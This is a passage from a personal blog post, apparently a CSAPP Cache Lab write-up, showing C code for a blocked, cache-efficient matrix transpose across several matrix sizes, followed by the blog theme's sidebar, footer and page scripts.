                a6 = A[ii][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[jj][i + <span class="number">0</span>] = a0;</span><br><span class="line">                    B[jj][i + <span class="number">1</span>] = a1;</span><br><span class="line">                    B[jj][i + <span class="number">2</span>] = a2;</span><br><span class="line">                    B[jj][i + <span class="number">3</span>] = a3;</span><br><span class="line">                    B[jj][i + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[jj][i + <span class="number">5</span>] = a5;</span><br><span class="line">                    B[jj][i + <span class="number">6</span>] = a6;</span><br><span class="line">                    B[jj][i + <span class="number">7</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; block_size; ++ii) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (jj = ii + <span class="number">1</span>; jj &lt; block_size; ++jj) &#123;</span><br><span class="line">                        a0 = B[j + ii][i + jj];</span><br><span class="line">                        B[j + ii][i + jj] = B[j + jj][i + ii];</span><br><span class="line">                        B[j + jj][i + ii] = a0;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (M == <span class="number">64</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> i, j, k, a0, a1, a2, a3, a4, a5, a6, a7, tmp;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i += block_size) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j += block_size) &#123;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; ++k) &#123;</span><br><span class="line">                    a0 = A[i + k][j + <span class="number">0</span>];</span><br><span class="line">                    a1 = A[i + k][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[i + k][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[i + k][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[i + k][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[i + k][j + <span class="number">5</span>];</span><br><span class="line">                    a6 = A[i + k][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[i + k][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j + <span class="number">0</span>][i + k] = a0;</span><br><span class="line">                    B[j + <span class="number">1</span>][i + k] = a1;</span><br><span class="line">                    B[j + <span class="number">2</span>][i + k] = a2;</span><br><span class="line">                    B[j + <span class="number">3</span>][i + k] = a3;</span><br><span class="line"></span><br><span class="line">                    B[j + <span class="number">0</span>][i + k + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[j + <span class="number">1</span>][i + k + <span class="number">4</span>] = a5;</span><br><span class="line">                    B[j + <span class="number">2</span>][i + k + <span class="number">4</span>] = a6;</span><br><span class="line">                    B[j + <span class="number">3</span>][i + k + <span class="number">4</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; ++k) &#123;</span><br><span class="line">                    a0 = A[i + <span class="number">4</span>][j + k];</span><br><span class="line">                    a1 = A[i + <span class="number">5</span>][j + k];</span><br><span class="line">                    a2 = A[i + <span class="number">6</span>][j + k];</span><br><span class="line">                    a3 = A[i + <span class="number">7</span>][j + k];</span><br><span class="line">                    a4 = A[i + <span class="number">4</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[i + <span class="number">5</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a6 = A[i + <span class="number">6</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a7 = A[i + <span class="number">7</span>][j + k + <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">                    tmp = B[j + k][i + <span class="number">4</span>]; B[j + k][i + <span class="number">4</span>] = a0; a0 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">5</span>]; B[j + k][i + <span class="number">5</span>] = a1; a1 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">6</span>]; B[j + k][i + <span class="number">6</span>] = a2; a2 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">7</span>]; B[j + k][i + <span class="number">7</span>] = a3; a3 = tmp;</span><br><span class="line"></span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">0</span>] = a0;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">1</span>] = a1;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">2</span>] = a2;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">3</span>] = a3;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">5</span>] = a5;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">6</span>] = a6;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">7</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 61 * 67, 1793 misses</span></span><br><span class="line">        <span class="keyword">int</span> i, j, k, l, a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">7</span> &lt; N &amp;&amp; j + <span class="number">7</span> &lt; M) &#123;</span><br><span class="line">                    <span class="comment">// bad</span></span><br><span class="line">                    <span class="comment">// for (k = i; k &lt; i + 8; ++k) &#123;</span></span><br><span class="line">                    <span class="comment">//     a0 = A[k][j + 0];</span></span><br><span class="line">                    <span class="comment">//     a1 = A[k][j + 1];</span></span><br><span class="line">                    <span class="comment">//     a2 = A[k][j + 2];</span></span><br><span class="line">                    <span class="comment">//     a3 = A[k][j + 3];</span></span><br><span class="line">                    <span class="comment">//     a4 = A[k][j + 4];</span></span><br><span class="line">                    <span class="comment">//     a5 = A[k][j + 5];</span></span><br><span class="line">                    <span class="comment">//     a6 = A[k][j + 6];</span></span><br><span class="line">                    <span class="comment">//     a7 = A[k][j + 7];</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//     B[j + 0][k] = a0;</span></span><br><span class="line">                    <span class="comment">//     B[j + 1][k] = a1;</span></span><br><span class="line">                    <span class="comment">//     B[j + 2][k] = a2;</span></span><br><span class="line">                    <span class="comment">//     B[j + 3][k] = a3;</span></span><br><span class="line">                    <span class="comment">//     B[j + 4][k] = a4;</span></span><br><span class="line">                    <span class="comment">//     B[j + 5][k] = a5;</span></span><br><span class="line">                    <span class="comment">//     B[j + 6][k] = a6;</span></span><br><span class="line">                    <span class="comment">//     B[j + 7][k] = a7;</span></span><br><span class="line">                    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// good</span></span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">for</span> (k = j; k &lt; j + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                        a0 = A[i + <span class="number">0</span>][k];</span><br><span class="line">                        a1 = A[i + <span class="number">1</span>][k];</span><br><span class="line">                        a2 = A[i + <span class="number">2</span>][k];</span><br><span class="line">                        a3 = A[i + <span class="number">3</span>][k];</span><br><span class="line">                        a4 = A[i + <span class="number">4</span>][k];</span><br><span class="line">                        a5 = A[i + <span class="number">5</span>][k];</span><br><span class="line">                        a6 = A[i + <span class="number">6</span>][k];</span><br><span class="line">                        a7 = A[i + <span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                        B[k][i + <span class="number">0</span>] = a0;</span><br><span class="line">                        B[k][i + <span class="number">1</span>] = a1;</span><br><span class="line">                        B[k][i + <span class="number">2</span>] = a2;</span><br><span class="line">                        B[k][i + <span class="number">3</span>] = a3;</span><br><span class="line">                        B[k][i + <span class="number">4</span>] = a4;</span><br><span class="line">                        B[k][i + <span class="number">5</span>] = a5;</span><br><span class="line">                        B[k][i + <span class="number">6</span>] = a6;</span><br><span class="line">                        B[k][i + <span class="number">7</span>] = a7;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (k = i; k &lt; N &amp;&amp; k &lt; i + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (l = j; l &lt; M &amp;&amp; l &lt; j + <span class="number">8</span>; ++l) &#123;</span><br><span class="line">                            B[l][k] = A[k][l];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Cache-Lab-Writeup/result-b.png">
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Garen Wang"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Garen Wang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Garen-Wang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Garen-Wang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:garen-wang@qq.com" title="E-Mail → mailto:garen-wang@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>



      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备2021003110号 </a>
      <img src="/images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Garen Wang</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : 'wMExYSieDga8BTVjfcUnCRh1-gzGzoHsz',
      appKey     : 'pYUGXalVN490u6EsT2HJA4Rj',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>


  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/live2dcubismcore.js"></script -->
  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/bundle.js"></script -->

  <canvas id="live2d" width="400" height="400" style="position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999;"></canvas>
  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js"></script>
  <script>
    var resourcesPath = 'https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/';
    var backImageName = '';
    var modelDir = ['jiaran4'];
    initDefine(resourcesPath, backImageName, modelDir);
  </script>

</body>
</html>
